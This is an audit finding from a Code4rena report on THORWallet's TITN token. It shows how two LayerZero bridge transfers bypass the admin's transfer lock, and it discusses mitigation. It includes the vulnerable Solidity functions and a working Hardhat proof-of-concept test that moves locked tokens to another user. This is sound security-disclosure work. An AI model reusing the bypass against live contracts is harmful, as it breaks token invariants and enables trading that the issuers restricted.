---
tags:
  - severity/high
  - has/github
  - has/poc
  - lang/solidity
  - sector/bridge
  - sector/staking
  - platform/code4rena
protocol: "[[THORWallet]]"
auditors:
  - Agorist
report: "https://code4rena.com/reports/2025-02-thorwallet"
genome:
  - "[[bridge-message-validation]]"
  - "[[access-roles]]"
  - "[[access-control/broken-logic]]"
  - "[[privilege-escalation/role-bypass]]"
  - "[[known-pattern]]"
  - "[[multi-tx]]"
  - "[[add-check]]"
  - "[[precondition/always]]"
  - "[[blast-radius/single-user]]"
---
# [H-2] The user can send tokens to any address by using two bridge transfers, even when transfers are restricted.

- id: 55397
- impact: HIGH
- protocol: THORWallet
- reporter: Agorist (Code4rena)
- source: https://code4rena.com/reports/2025-02-thorwallet

## Summary


The bug report discusses a vulnerability in the TITN contract that allows regular users to transfer tokens to any address, despite transfer restrictions set by the admin. This is due to a loophole in the code that allows users to perform two bridge transfers, bypassing the transfer restrictions. The impact of this bug is breaking the primary invariant of the contract and potentially allowing for speculative trading before the official token generation event. The report recommends disabling the `send` function or adding the `_validateTransfer` check to the `mint`/`burn` functions as mitigation steps. The team has confirmed and mitigated the issue by only allowing bridging to the sender's own address. The bug has been classified as medium severity, but has been raised to high severity due to the potential impact of speculative trading. The team has provided a PR to address the issue and the status is confirmed as mitigated. 

## Details



<https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol# L103>

### Finding description and impact

When `isBridgedTokensTransferLocked` is set to true, regular users’ `transfer` and `transferFrom` operations will be restricted. Regular users should not send their tokens to any address other than the `transferAllowedContract` and `lzEndpoint`. However, since bridge operations are not subject to this restriction, users can send tokens to any address by performing two bridge transfers.
This breaks the primary invariant: *Unless enabled (or the user is the admin), users who merge their TGT to TITN should not be able to transfer them to any address other than the LayerZero endpoint or a specified contract address (`transferAllowedContract`).*

### Proof of Concept

The TITN contract overrides the `transfer` and `transferFrom` functions, adding the `_validateTransfer` validation to restrict regular users’ transfers in certain cases, as determined by the admin.
<https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol# L71>.
```

    function transfer(address to, uint256 amount) public override returns (bool) {
        _validateTransfer(msg.sender, to);
        return super.transfer(to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _validateTransfer(from, to);
        return super.transferFrom(from, to, amount);
    }

     * @dev Validates transfer restrictions.
     * @param from The sender's address.
     * @param to The recipient's address.
     */
    function _validateTransfer(address from, address to) internal view {
        // Arbitrum chain ID
        uint256 arbitrumChainId = 42161;

        // Check if the transfer is restricted
        if (
            from != owner() && // Exclude owner from restrictions
            from != transferAllowedContract && // Allow transfers to the transferAllowedContract
            to != transferAllowedContract && // Allow transfers to the transferAllowedContract
            isBridgedTokensTransferLocked && // Check if bridged transfers are locked
            // Restrict bridged token holders OR apply Arbitrum-specific restriction
            (isBridgedTokenHolder[from] || block.chainid == arbitrumChainId) &&
            to != lzEndpoint // Allow transfers to LayerZero endpoint
        ) {
            revert BridgedTokensTransferLocked();
        }
    }
```

However, since bridge operations do not use `transfer`/`transferFrom`, but instead use `mint`/`burn`, this allows users to transfer tokens to any address by performing two bridge operations.

For example:

1. Currently, `isBridgedTokensTransferLocked` is set to `true`, and `user1` holds 1 Ether TITN on Arbitrum. `user1` wants to transfer these tokens to `user2`.
2. `user1` calls `send` to bridge the TITN to their address on Base.
3. `user1` calls `send` again on Base to bridge the TITN to `user2`’s address on Arbitrum.
4. `user1` successfully sends 1 Ether TITN to `user2`.

**Proof Of Concept**

To run the POC, you can add the following code to the test/hardhat/MergeTgt.test.ts file:
```

        it('user1  transfer TITN tokens to user2 by bridge when transfer disable', async function () {
            // transfer TGT to the merge contract
            await tgt.connect(user1).approve(mergeTgt.address, ethers.utils.parseUnits('100', 18))
            await tgt.connect(user1).transferAndCall(mergeTgt.address, ethers.utils.parseUnits('100', 18), '0x')
            // claim TITN
            const claimableAmount = await mergeTgt.claimableTitnPerUser(user1.address)
            await mergeTgt.connect(user1).claimTitn(claimableAmount)
            // attempt to transfer TITN (spoiler alert: it should fail)
            try {
                await arbTITN.connect(user1).transfer(user2.address, ethers.utils.parseUnits('1', 18))
                expect.fail('Transaction should have reverted')
            } catch (error: any) {
                expect(error.message).to.include('BridgedTokensTransferLocked')
            }

            // Minting an initial amount of tokens to ownerA's address in the TITN contract
            const initialAmount = ethers.utils.parseEther('1000000000')
            // Defining the amount of tokens to send and constructing the parameters for the send operation
            const tokensToSend = ethers.utils.parseEther('1')
            // Defining extra message execution options for the send operation
            const options = Options.newOptions().addExecutorLzReceiveOption(200000, 0).toHex().toString()
            const sendParam = [
                eidA,
                ethers.utils.zeroPad(user1.address, 32),
                tokensToSend,
                tokensToSend,
                options,
                '0x',
                '0x',
            ]
            // Fetching the native fee for the token send operation
            const [nativeFee] = await arbTITN.quoteSend(sendParam, false)
            // Executing the send operation from TITN contract
            const startBalanceBOnBase = await baseTITN.balanceOf(user1.address)

            await arbTITN.connect(user1).send(sendParam, [nativeFee, 0], user1.address, { value: nativeFee })
            const finalBalanceBOnBase = await baseTITN.balanceOf(user1.address)
            expect(startBalanceBOnBase).to.eql(ethers.utils.parseEther('0'))
            expect(finalBalanceBOnBase.toString()).to.eql(tokensToSend.toString())

            // Fetching the native fee for the token send operation
            const sendParam2 = [
                eidB,
                ethers.utils.zeroPad(user2.address, 32),
                tokensToSend,
                tokensToSend,
                options,
                '0x',
                '0x',
            ]
            const [nativeFee2] = await baseTITN.quoteSend(sendParam2, false)
            const startBalanceBOnArb = await arbTITN.balanceOf(user2.address)
            await baseTITN.connect(user1).send(sendParam2, [nativeFee, 0], user2.address, { value: nativeFee2 })
            const finalBalanceBOnArb = await arbTITN.balanceOf(user2.address)

            console.log("before user2 balance: ", startBalanceBOnArb);
            console.log("after user2 balance: ", finalBalanceBOnArb);

            expect(startBalanceBOnArb).to.eql(ethers.utils.parseEther('0'))
            expect(finalBalanceBOnArb.toString()).to.eql(tokensToSend.toString())
        })
```

**Logs**:
```

before user2 balance:  BigNumber { value: "0" }
after user2 balance:  BigNumber { value: "1000000000000000000" }
      ✔ user1  transfer TITN tokens to user2 by bridge when transfer disable
```

### Recommended mitigation steps

It is recommended to also disable the `send` function when `isBridgedTokensTransferLocked` is set to true. Alternatively, add the `_validateTransfer` check to the `mint`/`burn` functions.

**cacaomatt (THORWallet) confirmed**

**[0xnev (judge) commented](https://code4rena.com/audits/2025-02-thorwallet/submissions/F-9?commentParent=HBaWmKRTdKe):**

> Valid finding, medium severity as of now, given although the invariant is broken, afiak, no direct fund loss or exploit is possible.
>
> There is a case of speculative trading to price the tokens that directly go against another invariant. Would take any comments that makes a case for high severity regarding this impact.
>
> > Bridged TITN Tokens: Transfers are restricted to a pre-defined address (transferAllowedContract), set by the admin. Initially, this address will be the staking contract to prevent trading until the `isBridgedTokensTransferLocked flag` is disabled by the admin.

**[cryptoxz (THORWallet) commented](https://code4rena.com/audits/2025-02-thorwallet/submissions/F-9?commentParent=HBaWmKRTdKe&commentChild=kvGZUdiBJnb):**

> One of the main points to add this restriction was to prevent users to create a trading pool before TGE. We would like to explore more this issue as that would be a high concern for us.

**[cacaomatt (THORWallet) confirmed and commented](https://code4rena.com/audits/2025-02-thorwallet/submissions/F-9?commentParent=HBaWmKRTdKe&commentChild=EUqvh6hKDrp):**

> We’ve created a PR for this [here](https://github.com/THORWallet/TGT-TITN-merge-contracts/pull/4).

**[0xnev (judge) commented](https://code4rena.com/audits/2025-02-thorwallet/submissions/F-9?commentParent=HBaWmKRTdKe&commentChild=m5ogg9Phf9Y):**

> Raising to high severity, as of now, given the possible impact of speculative trading I mentioned above

**[THORWallet mitigated](https://github.com/code-423n4/2025-03-thorwallet-mitigation?tab=readme-ov-file# findings-being-mitigated):**.

> The PR [here](https://github.com/THORWallet/TGT-TITN-merge-contracts/tree/audit-4) only allows bridging to the sender’s own address.

**Status:** Mitigation confirmed. Full details in reports from [shaflow2](https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-4), [web3km](https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-9), and [kn0t](https://code4rena.com/evaluate/2025-03-thorwallet-mitigation-review/submissions/S-13).

---


